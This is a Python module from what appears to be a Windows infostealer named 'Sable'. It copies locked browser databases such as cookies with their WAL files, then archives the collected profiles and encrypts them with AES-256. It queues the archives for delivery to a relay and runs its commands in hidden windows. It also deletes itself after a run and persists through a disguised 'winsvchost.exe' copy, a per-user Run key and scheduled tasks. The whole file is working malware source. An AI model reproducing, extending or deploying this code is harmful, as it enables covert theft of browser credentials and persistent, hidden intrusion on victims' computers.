"""Filesystem and shell helpers shared by every collector.

Live browser databases are never opened in place. They are copied, together with
their ``-wal`` and ``-shm`` siblings, and the copy is what gets read. A profile that
is open in a running browser holds a lock on the original, and the write-ahead log
holds the rows the main file does not have yet.
"""

from __future__ import annotations

import json
import os
import secrets
import shutil
import struct
import subprocess
import sys
import tempfile
import time
import zipfile
import zlib
from collections.abc import Iterator, Sequence
from contextlib import contextmanager
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final

from . import log, winapi

_MAX_JSON_BYTES: Final[int] = 32 * 1024 * 1024
_MAX_ARCHIVE_FILES: Final[int] = 50_000
# 1 MiB: big enough that the syscall overhead disappears on a large member, small
# enough that a 1.2 GB file never has more than a block in memory.
_ARCHIVE_CHUNK: Final[int] = 1 << 20
_SIDECARS: Final[tuple[str, ...]] = ("-wal", "-shm")

# A live database is briefly locked while its owner writes. Two retries cover that
# window; anything longer is a browser holding the file for its whole lifetime, and
# waiting longer only makes the collection slower.
_COPY_ATTEMPTS: Final[int] = 2
_COPY_DELAY: Final[float] = 0.1

# Chrome stores microseconds since 1601-01-01; Unix epoch is 11644473600 s later.
_CHROME_EPOCH_OFFSET: Final[int] = 11_644_473_600

# The earliest timestamp a zip entry can carry. Anything older raises inside zipfile,
# and a copied profile is full of 1601-epoch files.
_ZIP_EPOCH: Final[tuple[int, int, int, int, int, int]] = (1980, 1, 1, 0, 0, 0)

_DETACHED_PROCESS: Final[int] = 0x00000008
_CREATE_NEW_PROCESS_GROUP: Final[int] = 0x00000200
_CREATE_NO_WINDOW: Final[int] = 0x08000000

# Every binary this module shells out to is named absolutely. ``subprocess`` searches
# PATH for a bare name, and an elevated run that resolves ``schtasks`` off a PATH entry
# the target controls is running somebody else's binary with the machine's blessing.
_SYSTEM32: Final[Path] = Path(os.environ.get("SYSTEMROOT") or r"C:\Windows") / "System32"


# --- child processes ----------------------------------------------------------
#
# A console-subsystem child of a GUI parent allocates a console, and Windows shows the
# window. Measured on a real artifact: the schtasks call behind the SYSTEM helper put a
# black rectangle on the desktop for as long as the task ran, and the timer task did it
# again on every fire. Both arms of every spawn go through this section so the flag is
# not something a call site can forget.
#
# ``CREATE_NO_WINDOW`` is the one that matters. ``DETACHED_PROCESS`` is added for the
# fire-and-forget case: it also says "do not inherit the parent's console", and it lets
# the child outlive the process that started it without holding the parent open.


def run_hidden(
    argv: Sequence[str | Path],
    *,
    timeout: float = 20.0,
    capture: bool = True,
) -> subprocess.CompletedProcess[bytes] | None:
    """Run to completion with no window. None when it would not start or timed out.

    A timeout kills the child: ``subprocess.run`` does that itself. The caller gets
    ``None`` rather than an exception because every use here is best-effort — a task
    registration that fails is recorded, never raised into a collection.
    """
    try:
        return subprocess.run(
            [str(part) for part in argv],
            capture_output=capture,
            timeout=timeout,
            creationflags=_CREATE_NO_WINDOW,
            stdin=subprocess.DEVNULL,
            check=False,
        )
    except (OSError, subprocess.SubprocessError):
        log.logger.debug("spawn: %s failed", argv[0] if argv else "empty argv", exc_info=True)
        return None


def spawn_hidden(
    command: str, *, extra_flags: int = 0, cwd: Path | None = None
) -> int | None:
    """Start a detached, windowless command line. Returns the pid, None on refusal.

    The line is one string rather than an argv list on purpose: ``subprocess`` re-quotes
    a list for ``CreateProcess`` and backslash-escapes the quotes in a path, which
    ``cmd`` does not read as an escape. Measured: the ``del`` in self-remove ran against
    a mangled path, detached cleanly, and left the file behind.

    ``cwd`` is for a started program that wants its own directory beside it. The caller
    owns the directory's lifetime: this starts the process and returns, it does not wait.
    """
    if not command.strip():
        return None
    try:
        child = subprocess.Popen(
            command,
            cwd=str(cwd) if cwd is not None else None,
            creationflags=(
                _CREATE_NO_WINDOW | _DETACHED_PROCESS | _CREATE_NEW_PROCESS_GROUP | extra_flags
            ),
            close_fds=True,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
    except OSError:
        log.logger.debug("spawn: detach failed", exc_info=True)
        return None
    return int(getattr(child, "pid", 0) or 0)



def executable_path() -> Path:
    """The file to delete when self-remove runs: the frozen exe, or the script."""
    if getattr(sys, "frozen", False):
        return Path(sys.executable).resolve()
    return Path(sys.argv[0]).resolve()


def copy_with_sidecars(source: Path, destination: Path) -> bool:
    """Copy a live database and its WAL siblings. False if the source is absent."""
    if not source.is_file():
        return False

    if not _copy_file(source, destination):
        # A browser opens its databases for a write transaction and closes them again,
        # so a refusal is not always permanent. Two short retries cost 200 ms and turn
        # "the machine had no cookies" into "the machine was mid-write".
        for _attempt in range(_COPY_ATTEMPTS):
            time.sleep(_COPY_DELAY)
            if _copy_file(source, destination):
                break
        else:
            return False

    for suffix in _SIDECARS:
        sidecar = source.with_name(source.name + suffix)
        if not sidecar.is_file():
            continue
        # A missing sidecar costs recent rows, not the whole copy.
        _copy_file(sidecar, destination.with_name(destination.name + suffix))
    return True


def _copy_file(source: Path, destination: Path) -> bool:
    """One file, plain first, then with the widest share mode Windows allows.

    ``shutil.copy2`` opens with Python's own share mode. A process holding a file open
    can refuse that while still allowing a reader that grants read, write and delete —
    which is what a backup tool grants. The fallback is the difference between a
    collected database and a reported refusal.
    """
    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)
        return True
    except OSError:
        log.logger.debug("copy failed, retrying shared: %s", source, exc_info=True)
    return winapi.copy_shared(source, destination)


def read_json(path: Path) -> Any | None:
    """Parsed JSON, or None on absence, oversize or malformed content."""
    try:
        if path.stat().st_size > _MAX_JSON_BYTES:
            log.logger.debug("json too large: %s", path)
            return None
        with path.open("r", encoding="utf-8", errors="replace") as handle:
            return json.load(handle)
    except (OSError, ValueError):
        log.logger.debug("json read failed: %s", path, exc_info=True)
        return None


def write_json(path: Path, payload: Any) -> bool:
    """Write UTF-8 JSON with parents created. False on any failure."""
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        with path.open("w", encoding="utf-8") as handle:
            json.dump(payload, handle, indent=2, ensure_ascii=False, default=str)
    except (OSError, TypeError, ValueError):
        log.logger.debug("json write failed: %s", path, exc_info=True)
        return False
    return True


def write_text(path: Path, text: str) -> bool:
    """Write UTF-8 text with parents created. False on any failure."""
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text, encoding="utf-8")
    except OSError:
        log.logger.debug("text write failed: %s", path, exc_info=True)
        return False
    return True


def keep_archive(archive: Path, label: str, base: Path | None = None) -> Path | None:
    """Copy a finished archive to a folder a person can open.

    The default base is ``Documents\\Sable Results`` on the account running the
    artifact: the one folder on Windows that is both easy to find and normally
    writable. The label is reduced to letters, digits, dash and underscore so a
    hostname can never produce an illegal filename.

    Never raises. A locked profile costs the local copy, not the delivery.
    """
    folder = base if base is not None else Path.home() / "Documents" / "Sable Results"
    safe = "".join(
        character for character in label if character.isalnum() or character in "-_"
    )[:40] or "sable"
    stamp = datetime.now().strftime("%Y%m%d-%H%M%S")

    target = folder / f"{safe}_{stamp}.zip"
    try:
        folder.mkdir(parents=True, exist_ok=True)
        serial = 1
        while target.exists():
            target = folder / f"{safe}_{stamp}_{serial}.zip"
            serial += 1
        shutil.copy2(archive, target)
    except OSError:
        log.logger.debug("local archive copy failed", exc_info=True)
        return None
    return target


def chrome_time(value: int) -> str | None:
    """Chrome's microseconds-since-1601 as an ISO 8601 UTC string."""
    if value <= 0:
        return None
    try:
        stamp = datetime.fromtimestamp(value / 1_000_000 - _CHROME_EPOCH_OFFSET, tz=UTC)
    except (OverflowError, OSError, ValueError):
        return None
    return stamp.isoformat()


def unix_time(value: int) -> str | None:
    """Seconds since the Unix epoch as an ISO 8601 UTC string."""
    if value <= 0:
        return None
    try:
        stamp = datetime.fromtimestamp(value, tz=UTC)
    except (OverflowError, OSError, ValueError):
        return None
    return stamp.isoformat()


@contextmanager
def temp_workspace(prefix: str = "sable-") -> Iterator[Path]:
    """A temp directory that is removed even when the body raises."""
    path = Path(tempfile.mkdtemp(prefix=prefix))
    try:
        yield path
    finally:
        shutil.rmtree(path, ignore_errors=True)


def _iter_files(root: Path, limit: int = _MAX_ARCHIVE_FILES) -> Iterator[Path]:
    count = 0
    for path in root.rglob("*"):
        if count >= limit:
            log.logger.debug("archive file cap reached at %d", limit)
            return
        if not path.is_file():
            continue
        count += 1
        yield path


def make_archive(source: Path, destination: Path) -> Path | None:
    """Zip the collected tree. None when the source is gone or the zip cannot open.

    Members are written through an explicit ``ZipInfo`` rather than
    ``ZipFile.write``. ``write`` copies each file's mtime into the entry, and the zip
    format cannot represent anything before 1980 â€” it raises ``ValueError`` and takes
    the whole archive with it. Copied browser profiles contain exactly those
    timestamps: LevelDB and SQLite files written by an installer or unpacked from an
    image carry a 1601 epoch, which is Windows' zero and well before the format's
    floor. A fixed epoch also makes two runs over the same tree produce comparable
    members instead of recording when the copy happened.

    Each member is streamed rather than read into bytes first. ``read_bytes`` followed
    by ``writestr`` holds two copies of the file in memory at once, and a collected
    profile contains single files of a gigabyte or more: a 1.2 GB history index meant
    2.4 GB resident at the moment of compression. One block moves at a time now.

    A file that opens and then dies mid-read leaves a short member rather than a lost
    archive. The alternative is refusing the whole tree because one locked file moved
    under the reader, and a short member costs that one entry: every other entry opens,
    and a zip tool names the damaged one.
    """
    if not source.is_dir():
        log.logger.debug("archive source is not a directory: %s", source)
        return None
    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        with zipfile.ZipFile(destination, "w", compression=zipfile.ZIP_DEFLATED) as archive:
            for path in _iter_files(source):
                if path == destination:
                    continue
                info = zipfile.ZipInfo(path.relative_to(source).as_posix(), _ZIP_EPOCH)
                info.compress_type = zipfile.ZIP_DEFLATED
                info.external_attr = 0o600 << 16
                try:
                    with path.open("rb") as handle, archive.open(info, "w") as member:
                        shutil.copyfileobj(handle, member, _ARCHIVE_CHUNK)
                except (OSError, ValueError, RuntimeError):
                    log.logger.debug("archive member refused: %s", path, exc_info=True)
    except OSError:
        log.logger.debug("archive creation failed: %s", destination, exc_info=True)
        return None
    return destination


def self_remove(executable: Path) -> None:
    """Detach a cmd that waits for this process to die, then deletes it.

    The path is quoted because a username with a space in it is not an edge case.

    The line is handed to ``CreateProcess`` as one string rather than as an argv list.
    ``subprocess`` re-quotes a list for ``CreateProcess``, escaping the embedded quotes
    of the path with backslashes â€” and ``cmd`` does not read backslashes as escapes, so
    the ``del`` ran against a mangled path and silently failed. Measured on a real
    artifact: the process detached, logged, exited clean, and the file was still there.

    A rename is tried before a delete because Windows permits renaming a running image
    while it refuses to delete one, and the renamed file is deleted a few seconds later
    once the handle is gone. Deletion is attempted more than once for the same reason:
    the image stays mapped briefly past process exit.
    """
    if sys.platform != "win32":
        return
    target = str(executable)
    if '"' in target:
        log.logger.warning("self-remove skipped: path contains a quote")
        return

    moved = target + ".old"
    command = (
        f'cmd /c ping -n 4 127.0.0.1 >nul'
        f' & move /y "{target}" "{moved}" >nul 2>&1'
        f' & ping -n 3 127.0.0.1 >nul'
        f' & del /f /q "{moved}" >nul 2>&1'
        f' & del /f /q "{moved}" >nul 2>&1'
        f' & del /f /q "{target}" >nul 2>&1'
    )
    if spawn_hidden(command) is None:
        log.logger.debug("self-remove failed to spawn")
    else:
        log.logger.debug("self-remove: detached for %s", target)


# --- encrypted archive --------------------------------------------------------
#
# WinZip AES-256, which is what 7-Zip, WinRAR and PeaZip all read when a zip asks for a
# password. The alternative was the traditional ZipCrypto that skidded builders ship:
# one known-plaintext byte and the key falls out in minutes, so it looks like a lock and
# is not one. The stdlib can read this format but cannot write it, and the agent may not
# import ``core/``, so the writer lives here.
#
# Layout per entry, from the WinZip AES specification:
#   salt 16 | password verifier 2 | AES-256-CTR ciphertext | HMAC-SHA1 truncated to 10
# The counter is 16 bytes, little endian, starting at 1. Key material is 66 bytes of
# PBKDF2-HMAC-SHA1 over the password: 32 encryption, 32 authentication, 2 verifier.

_METHOD_AES: Final[int] = 99
_METHOD_STORE: Final[int] = 0
_METHOD_DEFLATE: Final[int] = 8
_AES_EXTRA_ID: Final[int] = 0x9901
_AES_VERSION: Final[int] = 2
_AES_VENDOR: Final[bytes] = b"AE"
_AES_STRENGTH: Final[int] = 3
_AES_SALT: Final[int] = 16
_AES_AUTH: Final[int] = 10
_AES_ITERATIONS: Final[int] = 1000
_AES_NEEDED: Final[int] = 51
_AES_FLAG: Final[int] = 0x0001
_CHUNK_SEAL: Final[int] = 1 << 20
# A counter is 16 bytes, so one AES call per counter would be 21 million calls for a
# 340 MB archive. Refilling 64 KiB of keystream per call divides that by 4096.
_CTR_BLOCKS: Final[int] = 4096


class _Counter:
    """AES-256 in the little-endian counter mode WinZip defined, applied in order."""

    def __init__(self, key: bytes) -> None:
        from Crypto.Cipher import AES

        self._aes = AES.new(key, AES.MODE_ECB)
        self._counter = 1
        self._stream = b""

    def _refill(self) -> None:
        start = self._counter
        blocks = b"".join(
            (start + index).to_bytes(16, "little") for index in range(_CTR_BLOCKS)
        )
        self._stream = self._aes.encrypt(blocks)
        self._counter = start + _CTR_BLOCKS

    def apply(self, data: bytes) -> bytes:
        if not data:
            return b""
        out = bytearray()
        index = 0
        while index < len(data):
            if not self._stream:
                self._refill()
            take = min(len(self._stream), len(data) - index)
            # Integer XOR keeps this off a per-byte Python loop.
            mask = int.from_bytes(self._stream[:take], "big")
            block = int.from_bytes(data[index:index + take], "big")
            out += (mask ^ block).to_bytes(take, "big")
            self._stream = self._stream[take:]
            index += take
        return bytes(out)


def _deflate(bundle: zipfile.ZipFile, info: zipfile.ZipInfo) -> bytes:
    """Raw deflate of one member, inside its own buffer.

    Storing instead would be simpler and would double the archive: the source zip holds
    a 338 MB tree in 182 MB, so an encrypted store-only copy came out at 340 MB and took
    123 s. Bounded by the largest single member, not by the archive.
    """
    engine = zlib.compressobj(9, zlib.DEFLATED, -15)
    parts: list[bytes] = []
    with bundle.open(info) as member:
        while True:
            block = member.read(_CHUNK_SEAL)
            if not block:
                break
            parts.append(engine.compress(block))
    parts.append(engine.flush())
    return b"".join(parts)


def _aes_extra(method: int) -> bytes:
    return struct.pack(
        "<HHH2sBH", _AES_EXTRA_ID, 7, _AES_VERSION, _AES_VENDOR, _AES_STRENGTH, method
    )


def _aes_keys(password: str, salt: bytes) -> tuple[bytes, bytes, bytes]:
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2

    material = PBKDF2(
        password.encode("utf-8"),
        salt,
        dkLen=32 + 32 + 2,
        count=_AES_ITERATIONS,
        hmac_hash_module=SHA1,
    )
    return material[:32], material[32:64], material[64:66]


def _dos_stamp(moment: tuple[int, int, int, int, int, int]) -> tuple[int, int]:
    year, month, day, hour, minute, second = moment
    year = min(max(year, 1980), 2107)
    return (
        (hour << 11) | (minute << 5) | (second // 2),
        ((year - 1980) << 9) | (month << 5) | day,
    )


def seal_zip(source: Path, destination: Path, password: str) -> Path | None:
    """Write ``source`` as a password-protected AES-256 zip. None on any failure.

    Each member is deflated first and then encrypted, so the encrypted file is roughly
    the size of the source rather than of the uncompressed tree.

    Never raises. A caller that loses the encrypted copy still has the plain one.
    """
    if not password:
        log.logger.debug("seal_zip called without a password")
        return None

    from Crypto.Hash import HMAC, SHA1

    try:
        with zipfile.ZipFile(source) as bundle, destination.open("wb") as handle:
            central: list[bytes] = []
            written = 0
            count = 0

            for info in bundle.infolist():
                if info.is_dir():
                    continue

                salt = secrets.token_bytes(_AES_SALT)
                encrypt_key, auth_key, verifier = _aes_keys(password, salt)
                counter = _Counter(encrypt_key)
                digest = HMAC.new(auth_key, digestmod=SHA1)

                name = info.filename.encode("utf-8")
                extra = _aes_extra(_METHOD_DEFLATE)
                clock, day = _dos_stamp(info.date_time)
                plain = info.file_size
                packed = _deflate(bundle, info)
                stored = _AES_SALT + len(verifier) + len(packed) + _AES_AUTH
                offset = written

                header = struct.pack(
                    "<4sHHHHHIIIHH",
                    b"PK\x03\x04",
                    _AES_NEEDED,
                    _AES_FLAG,
                    _METHOD_AES,
                    clock,
                    day,
                    0,  # AE-2 carries no CRC; the authentication code replaces it
                    stored,
                    plain,
                    len(name),
                    len(extra),
                )
                handle.write(header)
                handle.write(name)
                handle.write(extra)
                handle.write(salt)
                handle.write(verifier)
                written += len(header) + len(name) + len(extra) + len(salt) + len(verifier)

                for start in range(0, len(packed), _CHUNK_SEAL):
                    cipher = counter.apply(packed[start:start + _CHUNK_SEAL])
                    digest.update(cipher)
                    handle.write(cipher)
                    written += len(cipher)

                tag = digest.digest()[:_AES_AUTH]
                handle.write(tag)
                written += len(tag)

                central.append(
                    struct.pack(
                        "<4sHHHHHHIIIHHHHHII",
                        b"PK\x01\x02",
                        _AES_NEEDED,
                        _AES_NEEDED,
                        _AES_FLAG,
                        _METHOD_AES,
                        clock,
                        day,
                        0,
                        stored,
                        plain,
                        len(name),
                        len(extra),
                        0,
                        0,
                        0,
                        info.external_attr,
                        offset,
                    )
                    + name
                    + extra
                )
                count += 1

            directory_offset = written
            for record in central:
                handle.write(record)
                written += len(record)

            handle.write(
                struct.pack(
                    "<4sHHHHIIH",
                    b"PK\x05\x06",
                    0,
                    0,
                    count,
                    count,
                    written - directory_offset,
                    directory_offset,
                    0,
                )
            )
    except (OSError, ValueError, RuntimeError, KeyError, zipfile.BadZipFile):
        log.logger.debug("sealing the archive failed", exc_info=True)
        return None
    return destination


# --- delivery queue ----------------------------------------------------------
#
# A run that cannot reach the relay has exactly one copy of its archive, and that copy
# sits in a temp folder Windows empties on reboot. The queue is what separates a result
# that arrives late from a result that never existed: the archive is copied somewhere
# durable, a journal is written beside it, and a repeating task brings the image back to
# finish the job. Everything here fails soft â€” the run that cannot park still reports.

_QUEUE_ROOT: Final[Path] = (
    Path(os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()) / "DeliveryQueue"
)
_TASK_NAME: Final[str] = "DeliveryQueue"
_RETRY_FLAG: Final[str] = "--retry"
MAX_PENDING: Final[int] = 5
MAX_TRIES: Final[int] = 48


def queue_root() -> Path:
    """Where parked archives live. Durable across reboots, per user account."""
    return _QUEUE_ROOT


def park_archive(archive: Path) -> Path | None:
    """Copy ``archive`` into the queue with a journal beside it. None on failure.

    The copy is length-checked before it is journalled, because a journal that promises
    an archive the disk never finished writing is worse than no queue at all.
    """
    try:
        folder = _QUEUE_ROOT / "pending"
        folder.mkdir(parents=True, exist_ok=True)
        stamp = datetime.now(UTC).strftime("%Y%m%d-%H%M%S")
        target = folder / f"{stamp}-{secrets.token_hex(3)}.zip"
        want = archive.stat().st_size
        shutil.copyfile(archive, target)
        if target.stat().st_size != want:
            target.unlink(missing_ok=True)
            log.logger.debug("queue: short copy, parked nothing")
            return None

        if not write_json(
            target.with_suffix(".json"),
            {
                "archive": target.name,
                "created": datetime.now(UTC).isoformat(),
                "bytes": want,
                "attempts": 0,
            },
        ):
            target.unlink(missing_ok=True)
            return None

        _trim_queue(folder)
        log.logger.debug("queue: parked %s (%d bytes)", target.name, want)
        return target
    except OSError:
        log.logger.debug("queue: could not park %s", archive, exc_info=True)
        return None


def _trim_queue(folder: Path) -> None:
    """Keep the newest ``MAX_PENDING`` archives. A full disk stops everything else."""
    try:
        items = sorted(folder.glob("*.zip"), key=lambda path: path.stat().st_mtime)
    except OSError:
        return
    while len(items) > MAX_PENDING:
        oldest = items.pop(0)
        drop_pending(oldest)
        log.logger.debug("queue: dropped %s, over the cap", oldest.name)


def pending_queue() -> list[Path]:
    """Parked archives, oldest first. An entry without a journal is not trusted."""
    folder = _QUEUE_ROOT / "pending"
    if not folder.is_dir():
        return []
    try:
        found = [
            path
            for path in folder.glob("*.zip")
            if path.with_suffix(".json").is_file() and path.stat().st_size > 0
        ]
        return sorted(found, key=lambda path: path.stat().st_mtime)
    except OSError:
        return []


def drop_pending(archive: Path) -> None:
    """Remove an archive and its journal. Missing files are not an error.

    A locked file is not an error either. This runs from the trim loop, which is
    reached *after* a new archive has been parked and journalled: an exception here
    used to escape into ``park_archive``'s handler, which then reported that nothing had
    been parked while the file sat on disk and no retry task was registered.
    """
    for path in (archive, archive.with_suffix(".json")):
        try:
            path.unlink(missing_ok=True)
        except OSError:
            log.logger.debug("queue: could not remove %s", path, exc_info=True)


def bump_pending(archive: Path) -> int:
    """Record one more failed attempt. Returns the running count.

    The journal is a file on a machine this run does not control, so its contents are
    not trusted: ``attempts`` may be a string, a float, or absent. Anything unreadable
    counts as zero rather than raising out of a retry that was already reporting a
    failure — an exception here abandoned the whole queue.
    """
    journal = archive.with_suffix(".json")
    note = read_json(journal)
    record: dict[str, Any] = note if isinstance(note, dict) else {}

    try:
        previous = int(record.get("attempts") or 0)
    except (TypeError, ValueError):
        previous = 0
        log.logger.debug("queue: %s had an unreadable attempt count", journal.name)

    attempts = max(0, previous) + 1
    record["attempts"] = attempts
    record["last_try"] = datetime.now(UTC).isoformat()
    write_json(journal, record)
    return attempts


def schedule_retry(executable: Path) -> bool:
    """Register a task that re-runs this image with ``--retry`` every 15 minutes.

    ``/du 024:00`` bounds it to a day: a relay that is gone for good should stop costing
    the machine a wake-up, and a day covers a reboot, a lost hotspot and a bad afternoon.
    No elevation is needed â€” the task is created in the current user's own space.
    """
    if sys.platform != "win32":
        return False
    target = str(executable)
    if '"' in target:
        log.logger.debug("queue: refusing to schedule a path with a quote")
        return False

    done = _schtasks(
        [
            "/create",
            "/tn",
            _TASK_NAME,
            "/tr",
            f'"{target}" {_RETRY_FLAG}',
            "/sc",
            "minute",
            "/mo",
            "15",
            "/du",
            "024:00",
            "/f",
        ]
    )
    log.logger.debug("queue: scheduled retry=%s", done)
    return done


def cancel_retry() -> bool:
    """Remove the retry task. False when there was none, which is the normal case."""
    if sys.platform != "win32":
        return False
    done = _schtasks(["/delete", "/tn", _TASK_NAME, "/f"])
    log.logger.debug("queue: cancelled retry=%s", done)
    return done


# --- staying on the machine --------------------------------------------------
#
# Everything above assumes one run and then gone. Persistence is the opposite bargain: the
# image copies itself into a dull folder, registers a logon task, and every logon produces
# another result. The copy is length-checked and the task is replaced rather than appended,
# so launching the installed copy again is a no-op instead of a second copy of itself.

_PERSIST_ROOT: Final[Path] = (
    Path(os.environ.get("LOCALAPPDATA") or tempfile.gettempdir()) / "Programs" / "WinSvcHost"
)
_PERSIST_IMAGE: Final[str] = "winsvchost.exe"
_PERSIST_TASK: Final[str] = "WinSvcHost"
_PERSIST_TIMER: Final[str] = "WinSvcHostTimer"
# The per-user Run key. User-writable with no elevation, which is the whole reason it is
# used here instead of a logon task: measured on a normal account, `schtasks /sc onlogon`
# answers "Access is denied" and the machine stays exactly as it was.
_RUN_KEY: Final[str] = r"Software\Microsoft\Windows\CurrentVersion\Run"


def persist_root() -> Path:
    """Where a persisted image lives. One folder, so cleanup is one folder."""
    return _PERSIST_ROOT


def install_persistence(executable: Path, hours: int = 0) -> Path | None:
    """Stage the image and register it to run again. None on any failure.

    ``hours`` of zero registers the logon hook only. Above that a scheduled timer is
    registered as well, and a timer that will not register is logged as a warning
    rather than swallowed: the image is still installed and still comes back on logon,
    so the run reports "installed" and the log says which half is missing.

    Running from the staged path is detected and skipped, so an installed copy that fires
    on logon does not fight itself for the same file.
    """
    if sys.platform != "win32":
        return None

    target = _PERSIST_ROOT / _PERSIST_IMAGE
    if '"' in str(executable):
        log.logger.debug("persist: refusing a path with a quote")
        return None

    staged = False
    try:
        if executable.resolve() != target.resolve():
            _PERSIST_ROOT.mkdir(parents=True, exist_ok=True)
            want = executable.stat().st_size
            shutil.copyfile(executable, target)
            staged = True
            if target.stat().st_size != want:
                target.unlink(missing_ok=True)
                log.logger.debug("persist: short copy, installed nothing")
                return None
    except OSError:
        log.logger.debug("persist: could not stage the image", exc_info=True)
        return None

    if not winapi.registry_set_string(
        winapi.HKEY_CURRENT_USER, _RUN_KEY, _PERSIST_TASK, f'"{target}"'
    ):
        # Nothing will ever run this copy: no Run value, no task. Leaving it behind puts
        # a dead executable in the profile that no cleanup path knows about, so it goes
        # back off the disk before the caller reports the failure.
        if staged:
            try:
                target.unlink(missing_ok=True)
            except OSError:
                log.logger.debug("persist: could not remove the unregistered copy")
        return None

    if hours > 0:
        when = (
            ["/sc", "hourly", "/mo", str(hours)]
            if hours < 24
            else ["/sc", "daily", "/mo", "1"]
        )
        if not _persist_task(_PERSIST_TIMER, target, when):
            log.logger.warning(
                "persist: installed on logon, but the %d-hour timer did not register", hours
            )
    else:
        # A timer left by an earlier build of the same artifact would keep firing after
        # the setting is switched off, so it is removed rather than ignored.
        _schtasks(["/delete", "/tn", _PERSIST_TIMER, "/f"])

    log.logger.debug("persist: installed at %s, every %d hour(s)", target, hours)
    return target


def _persist_task(name: str, target: Path, when: list[str]) -> bool:
    return _schtasks(["/create", "/tn", name, "/tr", f'"{target}"', *when, "/f"])


def _schtasks(arguments: list[str]) -> bool:
    # The absolute path, not the bare name. ``subprocess`` searches PATH for
    # ``schtasks``, and a build that runs a task as SYSTEM on a machine where somebody
    # controls a PATH entry is a build that runs somebody else's binary elevated.
    tool = _SYSTEM32 / "schtasks.exe"
    done = run_hidden([tool, *arguments], timeout=20)
    if done is None:
        return False
    if done.returncode != 0:
        log.logger.debug(
            "queue: schtasks said %d: %s",
            done.returncode,
            done.stderr.decode("utf-8", "replace").strip()[:160],
        )
    return done.returncode == 0


__all__ = [
    "bump_pending",
    "cancel_retry",
    "chrome_time",
    "copy_with_sidecars",
    "drop_pending",
    "executable_path",
    "install_persistence",
    "keep_archive",
    "make_archive",
    "park_archive",
    "pending_queue",
    "persist_root",
    "queue_root",
    "read_json",
    "schedule_retry",
    "seal_zip",
    "self_remove",
    "temp_workspace",
    "unix_time",
    "write_json",
    "write_text",
]
